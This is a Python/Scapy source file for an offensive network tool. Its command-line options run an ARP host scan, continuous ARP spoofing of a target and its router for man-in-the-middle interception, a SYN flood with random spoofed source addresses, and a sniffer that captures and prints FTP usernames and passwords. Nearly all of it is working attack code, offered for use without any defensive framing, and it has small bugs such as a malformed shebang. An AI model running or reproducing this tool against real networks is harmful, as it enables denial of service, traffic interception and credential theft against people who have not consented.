#!/usr/bind/env python
#_*_ coding: utf8 _*_

from scapy.all import *
from banner.banner import *
import argparse
import os
import time

parse = argparse.ArgumentParser()
########## Menu
parse.add_argument("-m","--menu",help="Option menu",action='store_true')
########## Scan Hosts
parse.add_argument("-r","--range",help="Range of addresses to scan")
########## Spoofing
parse.add_argument("-t","--target",help="Target to spoof")
parse.add_argument("-s","--spoofed",help="IP router")
########## Synflood
parse.add_argument("-syn","--synflood",help="Flood target")
######### FTP Sniffing
parse.add_argument("-i","--interface",help="Network interface")
parse = parse.parse_args()


def IPscan(ip):
	range_ip = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	packet = broadcast/range_ip
	res = srp(packet,timeout=2,verbose=False)[0]
	
	for n in res:
		print("-" * 48)
		print("[+] \033[0;32mHOST:\033[0m {}\t| \033[0;32mMAC:\033[0m {}".format(n[1].psrc,n[1].hwsrc))	 	 


def getMAC(ip):
	ip_layer = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	packet = broadcast/ip_layer
	answer = srp(packet,timeout=2,verbose=False)[0]

	mac = answer[0][1].hwsrc
	return mac

def spoof(target,spoofed):
	mac = getMAC(target)
	spoofer_mac = ARP(op=2,hwdst=mac,pdst=target,psrc=spoofed)
	send(spoofer_mac,verbose=False)


def synflood(target):
	message = "**SYNFLOOD ATTACK!**"
	try:
		packet_count = 0
		while True:
			src_ip = RandIP()
			src_port = RandShort()
			dport = RandShort()

			IP_layer = IP(src=src_ip,dst=target)
			TCP_layer = TCP(sport=src_port,dport=dport)
			Raw_layer = Raw(load=message)
			packet = IP_layer/TCP_layer/Raw_layer
			send(packet,verbose=False)

			packet_count = packet_count + 1
			print("\033[0;32mPACKET:\033[0m " + str(packet_count) + "\t\033[0;32mSRC_IP:\033[0m " + str(src_ip) + "\t\033[0;32mSRC_PORT:\033[0m " + str(src_port)),sys.stdout.flush()

	except KeyboardInterrupt:
		exit(0)


def sniff_FTP(packet):
	if packet[TCP].dport == 21:
		credentials = packet.sprintf("%Raw.load%")
		if "USER" in credentials:
			print("[+] FTP IP: " + packet[IP].dst)
			credentials = credentials.split(" ")
			credentials = credentials[1]
			print("[+] FTP USER: " + credentials)
		elif "PASS" in credentials:
			credentials = credentials.split(" ")
			credentials = credentials[1]
			print("[+] FTP PASSWORD: " + credentials)

def main():
	if parse.menu:
		bannerMenu()

	elif parse.range:
		scanH()
		print("Target -> \033[1;37m{}\033[0m".format(parse.range))
		IPscan(parse.range)

	elif parse.target:
		try:
			spoofing()
			print("\nmode: \033[0;32mON\033[0m")
			print("Target -> \033[1;37m{}\033[0m".format(parse.target))
			print("IP router -> \033[1;37m{}\033[0m".format(parse.spoofed))
			while True:
				if parse.target:
					spoof(parse.target,parse.spoofed)
					spoof(parse.spoofed,parse.target)
				else:
					exit(0)
		except KeyboardInterrupt:
			time(1)
			print("\033[0;31mExiting...\033[0m")
			exit(0)

	elif parse.synflood:
		synflood_banner()
		print("Target -> \033[1;37m{}\033[0m\n".format(parse.synflood))
		synflood(parse.synflood)

	elif parse.interface:
		ftp_sniff()
		print("\nmode: \033[0;32mON\033[0m")
		sniff(iface=parse.interface,filter="tcp and port 21",prn=sniff_FTP)

	else:
		error()


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()			
